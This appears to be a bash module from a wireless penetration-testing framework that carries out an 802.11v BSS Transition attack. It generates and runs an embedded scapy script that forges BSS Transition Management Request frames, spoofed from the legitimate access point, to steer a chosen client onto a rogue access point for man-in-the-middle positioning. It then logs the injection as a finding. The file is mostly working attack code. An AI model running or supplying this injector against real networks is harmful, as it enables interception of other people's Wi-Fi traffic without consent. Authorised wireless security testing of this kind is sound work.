#!/usr/bin/env bash
# MODULE_META
# NAME="BSS Transition Attack (802.11v)"
# CATEGORY="G"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,python3,scapy"
# DESC="Force clients to transition to a malicious AP using 802.11v BSS Transition Management Requests"
# REQS="monitor_iface,target_ssid,target_bssid"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/g5_bss_transition_attack.sh
#  G5: BSS Transition Attack (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Use TARGET_CLIENT provided by Go brain.
#  2. Send a 'BSS Transition Management Request' frame to the client.
#  3. The request "recommends" the client move to a new BSSID (our rogue AP).
#  4. This allows for a "polite" MITM attack that does not require deauth.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G5"
TARGET_CLIENT="${TARGET_CLIENT:-}"
ROGUE_BSSID="${ROGUE_BSSID:-00:11:22:33:44:55}" # From Go brain

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. BSS Transition requires a victim station."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting BSS Transition (802.11v) mission for: ${C_VAR}$TARGET_CLIENT${C_RESET}"
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Injecting BTM requests..."

# Execute Active Injection
echo -e "[*] Injecting 802.11v BTM Request to steer ${C_VAR}$TARGET_CLIENT${C_RESET} to ${C_VAR}$ROGUE_BSSID${C_RESET}..."
PYTHON_INJECTOR="${EVIDENCE_DIR}/g5_inject.py"

cat <<EOF > "$PYTHON_INJECTOR"
from scapy.all import *
import sys

target_client = sys.argv[1]
source_ap = sys.argv[2]
rogue_ap = sys.argv[3]
iface = sys.argv[4]

print(f"[*] Sending BTM Request to {target_client} from {source_ap}...")

# 802.11v BSS Transition Management Request
# Type: Management (0), Subtype: 13 (Action)
# Category: WNM (10), Action: BTM Request (7)
pkt = RadioTap() / Dot11(addr1=target_client, addr2=source_ap, addr3=source_ap) / \
      Dot11Action(category=10, action=7) / \
      Raw(load=b"\x01\x00\x00\x00\x00" + bytes.fromhex(rogue_ap.replace(":", "")))

sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
EOF

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE"
else
    python3 "$PYTHON_INJECTOR" "$TARGET_CLIENT" "$BSSID" "$ROGUE_BSSID" "$INTERFACE" > /dev/null 2>&1
fi

# Reporting
echo -e "[+] Transition injection complete."
"$ASTRA_BIN" record-finding \
    --session-dir "$SESSION_DIR" \
    --tc "$TC_ID" \
    --type vulnerability \
    --name "BSS Transition Injection Executed" \
    --severity HIGH \
    --desc "Injected 802.11v BTM Request frames to steer client $TARGET_CLIENT to $ROGUE_BSSID." \
    --target "$TARGET_CLIENT" \
    --evidence "$PYTHON_INJECTOR" \
    --rationale "Abusing 802.11v allows for 'silent' MITM positioning."

# 🏁 FINAL SIGNAL
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit 0
